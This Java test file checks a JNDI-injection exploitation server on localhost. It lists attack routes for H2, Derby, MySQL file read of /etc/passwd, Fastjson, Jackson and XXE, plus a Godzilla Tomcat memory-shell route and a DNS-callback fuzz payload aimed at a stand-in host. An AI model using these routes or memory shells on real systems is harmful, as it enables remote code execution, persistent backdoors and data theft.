package com.bloom.server;

import com.bloom.util.config;
import com.unboundid.ldap.sdk.LDAPConnection;
import com.unboundid.ldap.sdk.SearchResultEntry;
import com.unboundid.ldap.sdk.SearchScope;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.URL;

/**
 * P2/P3 新链 + GEN 内存马路由的端到端验证：走真实 LDAP 服务端，
 * 断言 BeanFactory 系链直返 javaNamingReference 属性、GEN 路由类字节码可取。
 */
public class NewChainsE2ETest {

    private static int ldapPort;
    private static int httpPort;

    @BeforeClass
    public static void startServers() throws Exception {
        ldapPort = freePort();
        httpPort = freePort();
        config.ip = "127.0.0.1";
        config.ldapPort = ldapPort;
        config.httpPort = httpPort;
        com.bloom.server.HttpServerStart.start();
        com.bloom.server.LdapServer.lanuchLDAPServer();
        Thread.sleep(300);
    }

    // P2/P3 BeanFactory 系新链：默认序列化投递（序列化 ResourceRef），目标反序列化命中工厂。
    @Test
    public void newBeanFactoryChainsReturnSerializedReference() throws Exception {
        String[] routes = {
                "h2_alias/id",
                "h2_runscript/http://127.0.0.1/poc.sql",
                "h2_groovy/id",
                "postgresql_socketFactory/org.springframework.context.support.ClassPathXmlApplicationContext#http://127.0.0.1/poc.xml",
                "mysql_deserialize/127.0.0.1:3306",
                "mysql_deserialize5/127.0.0.1:3306",
                "mysql_fileread/127.0.0.1:3306#/etc/passwd",
                "fastjson1/ldap://127.0.0.1:1389/evil",
                "fastjson2/ldap://127.0.0.1:1389/evil",
                "tomcat_memUserDb/http://127.0.0.1:8888/../../../../tmp/poc.jsp",
                "derby_rce/http://127.0.0.1/exploit.jar",
                "hikaricp_h2/id",
                "hsqldb_initSql/jdbc:hsqldb:hsql://127.0.0.1:9001/test",
                "mlet/http://127.0.0.1:8080/",
                "tomcat_jshell/id",
                "tomcat_xxe/http://127.0.0.1:8888/xxe.xml",
                "hessian/http://127.0.0.1:8080/HessianService",
                "jackson/ldap://127.0.0.1:1389/evil",
        };
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            for (String route : routes) {
                SearchResultEntry entry = conn.searchForEntry(route, SearchScope.BASE, "(objectClass=*)");
                Assert.assertNotNull(route, entry);
                byte[] ser = entry.getAttributeValueBytes("javaSerializedData");
                Assert.assertNotNull(route + " 应含 javaSerializedData", ser);
                Assert.assertTrue(route + " 应为合法 Java 序列化流",
                        ser.length > 4 && (ser[0] & 0xFF) == 0xAC && (ser[1] & 0xFF) == 0xED);
                Assert.assertTrue(route + " 反序列化应为 Reference", deserialize(ser) instanceof javax.naming.Reference);
                Assert.assertNull(route + " 默认不应属性直返", entry.getAttributeValues("javaReferenceAddress"));
            }
        }
    }

    // GEN 内存马路由（basic）：javaFactory 为模板简单名，HTTP 侧能取到类字节码。
    @Test
    public void genMemshellRouteServesClass() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry(
                    "basic/memshell/GEN:tomcat/godzilla/filter", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertEquals("TomcatFilterMemShellFromThread", entry.getAttributeValue("javaFactory"));
            Assert.assertNotNull(entry.getAttributeValue("javaCodeBase"));

            URL url = new URL("http://127.0.0.1:" + httpPort + "/TomcatFilterMemShellFromThread.class");
            HttpURLConnection http = (HttpURLConnection) url.openConnection();
            Assert.assertEquals("HTTP 侧应能取到 GEN 模板字节码", 200, http.getResponseCode());
            Assert.assertTrue(http.getContentLength() > 0);
            http.disconnect();
        }
    }

    // GEN 组合不存在时服务端不得产出工厂属性，避免目标端 404 假象。
    @Test
    public void invalidGenComboRejected() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry(
                    "basic/memshell/GEN:nginx/cmd/filter", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            String factory = entry.getAttributeValue("javaFactory");
            Assert.assertTrue("非法 GEN 组合不得伪装成功: " + factory,
                    factory == null || "INVALID".equals(factory));
        }
    }

    // fuzz 路由对新链（如 h2_alias）应生成带出网命令的序列化 Reference。
    @Test
    public void fuzzRouteOnNewChainWorks() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry(
                    "fuzz/h2_alias/dnslog.example", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            byte[] ser = entry.getAttributeValueBytes("javaSerializedData");
            Assert.assertNotNull(ser);
            javax.naming.Reference ref = (javax.naming.Reference) deserialize(ser);
            boolean hasFuzzDomain = false;
            java.util.Enumeration<? extends javax.naming.RefAddr> addrs = ref.getAll();
            while (addrs.hasMoreElements()) {
                javax.naming.RefAddr a = addrs.nextElement();
                if (a.getContent() != null && a.getContent().toString().contains("h2_alias.dnslog.example")) {
                    hasFuzzDomain = true;
                }
            }
            Assert.assertTrue("fuzz 命令应含 h2_alias.dnslog.example", hasFuzzDomain);
        }
    }

    private static int freePort() throws Exception {
        try (ServerSocket socket = new ServerSocket(0)) {
            return socket.getLocalPort();
        }
    }

    private static Object deserialize(byte[] bytes) throws Exception {
        try (java.io.ObjectInputStream ois = new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(bytes))) {
            return ois.readObject();
        }
    }
}
